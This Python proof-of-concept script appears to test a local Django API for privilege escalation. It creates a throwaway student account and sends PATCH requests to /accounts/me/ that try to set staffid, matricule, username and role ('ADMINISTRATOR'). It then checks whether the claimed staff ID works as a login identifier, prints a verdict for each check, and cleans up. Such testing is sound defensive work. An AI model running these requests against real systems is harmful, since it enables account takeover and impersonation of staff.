"""PROOF-OF-CONCEPT: privilege escalation via PATCH /accounts/me/.

Read-only verification: creates a throwaway account, then attempts to write
privileged fields through the generic profile-update endpoint. Does NOT touch
any seeded/demo account. Leaves nothing behind (the throwaway user is deleted
at the end).

Checks:
  A. Can an ordinary STUDENT write `staffid` (a login identifier)?   -> escalation
  B. Can they write `matricule`?                                     -> escalation
  C. Can they write `username`?                                      -> lesser
  D. Is `role` correctly protected?
  E. Does a claimed staffid then let them log in under it?
"""

import json
import urllib.error
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar

BASE = "http://localhost:8000/api/v1"


class API:
    def __init__(self):
        self.cj = CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cj)
        )

    def csrf(self):
        for c in self.cj:
            if c.name == "csrftoken":
                return c.value
        return None

    def req(self, method, path, payload=None):
        headers = {"Content-Type": "application/json"}
        if self.cj:
            headers["Cookie"] = "; ".join(f"{c.name}={c.value}" for c in self.cj)
        if method != "GET" and self.csrf():
            headers["X-CSRFToken"] = self.csrf()
        data = json.dumps(payload).encode() if payload is not None else None
        r = urllib.request.Request(
            BASE + path, data=data, method=method, headers=headers
        )
        try:
            with self.opener.open(r) as resp:
                return resp.status, json.loads(resp.read().decode())
        except urllib.error.HTTPError as e:
            return e.code, json.loads(e.read().decode())


def main():
    import os
    import django

    os.environ.setdefault("DJANGO_SETTINGS_MODULE", "config.settings")
    django.setup()
    from apps.accounts.models import User
    from apps.accounts.services.email_otp import verify_otp  # noqa: F401

    marker = "poc-escalation"
    User.objects.filter(username__startswith=marker).delete()
    print("cleaned any prior PoC users\n")

    # Build a throwaway ordinary student, fully verified so login is permitted.
    u = User.objects.create_user(
        f"{marker}@example.test", f"{marker}-user", "PoC", "Student", "StrongPass!2026"
    )
    u.is_email_verified = True
    u.role = User.Role.STUDENT
    u.matricule = None
    u.staffid = None
    u.save()
    print(f"throwaway student: {u.email}  role={u.role}  matricule={u.matricule}  staffid={u.staffid}\n")

    api = API()
    api.req("GET", "/accounts/csrf/")
    st, body = api.req(
        "POST", "/accounts/login/", {"identifier": u.email, "password": "StrongPass!2026"}
    )
    assert st == 200, body
    print("logged in as the ordinary student\n")

    print("=" * 66)
    print("A/B/C. can a STUDENT write privileged identity fields on itself?")
    print("=" * 66)

    findings = []

    st, body = api.req("PATCH", "/accounts/me/", {"staffid": "LEC999-PWNED"})
    ok = st == 200 and body.get("data", {}).get("staffid") == "LEC999-PWNED"
    print(f"  PATCH staffid   -> HTTP {st}  staffid now = {body.get('data', {}).get('staffid')!r}")
    findings.append(("staffid writable by a student", ok))

    st, body = api.req("PATCH", "/accounts/me/", {"matricule": "FE99-PWNED"})
    ok2 = st == 200 and body.get("data", {}).get("matricule") == "FE99-PWNED"
    print(f"  PATCH matricule -> HTTP {st}  matricule now = {body.get('data', {}).get('matricule')!r}")
    findings.append(("matricule writable by a student", ok2))

    st, body = api.req("PATCH", "/accounts/me/", {"username": "poc-renamed-user"})
    ok3 = st == 200 and body.get("data", {}).get("username") == "poc-renamed-user"
    print(f"  PATCH username  -> HTTP {st}  username now = {body.get('data', {}).get('username')!r}")
    findings.append(("username writable by a student", ok3))

    print("\n" + "=" * 66)
    print("D. is `role` protected? (must be refused)")
    print("=" * 66)
    st, body = api.req("PATCH", "/accounts/me/", {"role": "ADMINISTRATOR"})
    role_after = body.get("data", {}).get("role")
    protected = role_after == "STUDENT"
    print(f"  PATCH role      -> HTTP {st}  role now = {role_after!r}")
    findings.append(("role correctly protected", protected))

    print("\n" + "=" * 66)
    print("E. can the claimed staffid now be used as a LOGIN identifier?")
    print("=" * 66)
    api2 = API()
    api2.req("GET", "/accounts/csrf/")
    st, body = api2.req(
        "POST", "/accounts/login/", {"identifier": "LEC999-PWNED", "password": "StrongPass!2026"}
    )
    logged_in = st == 200 and body.get("data", {}).get("email") == u.email
    print(f"  login as 'LEC999-PWNED' -> HTTP {st}  authenticated as {body.get('data', {}).get('email')!r}")
    findings.append(("claimed staffid usable as login identifier", logged_in))

    print("\n" + "=" * 66)
    print("SUMMARY")
    print("=" * 66)
    for label, vulnerable in findings:
        if label == "role correctly protected":
            verdict = "OK (protected)" if vulnerable else "VULNERABLE"
        else:
            verdict = "VULNERABLE" if vulnerable else "blocked"
        print(f"  {label:<45} {verdict}")

    # cleanup
    User.objects.filter(username__startswith=marker).delete()
    print("\nthrowaway user deleted; no demo data touched.")


if __name__ == "__main__":
    main()
